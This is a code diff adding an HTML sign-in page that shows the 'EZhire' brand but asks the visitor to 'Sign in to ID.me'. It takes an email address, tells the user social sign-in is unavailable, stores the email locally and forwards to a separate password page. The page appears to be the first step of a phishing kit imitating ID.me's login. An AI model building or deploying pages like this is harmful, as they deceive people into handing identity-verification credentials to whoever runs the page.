@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Secure Sign In</title>
+    <link rel="stylesheet" href="./css/login-style.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Keania+One&family=Space+Grotesk:wght@300..700&display=swap"
+        rel="stylesheet">
+    <link rel="icon" href="favicon.jpg" type="image/png">
+
+</head>
+
+<body>
+
+    <!-- BRAND AREA -->
+    <header class="brand-bar">
+        <div class="brand-placeholder">
+            <img src="./brand.png" alt="" id="brand-img">
+            <span>+</span>
+            <div class="brand">
+                <span class="brand-text">EZhire</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- AUTH CARD -->
+    <main class="auth-wrapper">
+        <div class="auth-card">
+
+            <!-- TITLE -->
+            <center>
+                <h2>Sign in to ID.me</h2>
+            </center>
+
+            <!-- EMAIL INPUT -->
+            <label>Email</label>
+            <input type="email" placeholder="Enter email address" id="dataInput" />
+
+            <!-- REMEMBER ME -->
+            <div class="checkbox-row">
+                <input type="checkbox" id="remember">
+                <label for="remember">Remember me</label>
+            </div>
+
+            <!-- BUTTON -->
+            <button class="primary-btn" id="sendBtn">Continue</button>
+
+            <!-- LINKS -->
+            <p class="muted">
+                New to ID.me? <a href="#">Create an account</a>
+            </p>
+
+            <div class="info-box">
+                Social sign-in is unavailable. Please use your email.
+            </div>
+
+        </div>
+    </main>
+
+    <!-- PAGE FOOTER -->
+    <footer class="page-footer">
+        <div class="language-select">
+            <select>
+                <option selected>English</option>
+                <option>Français</option>
+                <option>Español</option>
+                <option>Deutsch</option>
+            </select>
+        </div>
+
+        <div class="footer-links">
+            <a href="#">What is this service?</a>
+            <span>|</span>
+            <a href="#">Terms of Service</a>
+            <span>|</span>
+            <a href="#">Privacy Policy</a>
+        </div>
+    </footer>
+
+
+</body>
+
+<script>
+    document.getElementById('sendBtn').addEventListener('click', () => {
+        const email = document.getElementById('dataInput');
+        const remember = document.getElementById('remember').checked;
+
+        // Simple validation
+        if (!email.value.trim() || !email.value.includes('@')) {
+            email.focus();
+            return;
+        }
+
+        localStorage.setItem('signinEmail', email.value.trim());
+        localStorage.setItem('rememberMe', remember);
+        window.location.href = 'login-password-page.html';
+    });
+
+</script>
+
+</html>
